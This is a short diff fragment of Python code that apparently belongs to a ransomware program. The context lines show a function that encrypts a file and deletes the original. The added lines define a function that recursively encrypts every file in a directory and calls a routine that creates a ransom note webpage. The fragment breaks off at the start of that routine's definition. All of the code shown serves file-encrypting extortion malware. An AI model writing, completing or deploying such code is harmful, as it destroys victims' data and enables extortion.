@@ -60,3 +60,13 @@ def encrypt_file(file_path: str, password: str):
         f.write(encrypted_data)
     os.remove(file_path)
     print(f"Encrypted and deleted: {file_path} -> {new_file_path}")
+
+def encrypt_directory(directory: str, password: str):
+    """Recursively encrypt all files in the given directory."""
+    for root, _, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            encrypt_file(file_path, password)
+        create_ransom_note_webpage(directory)
+        
+def create_ransom_note_webpage(directory: str):
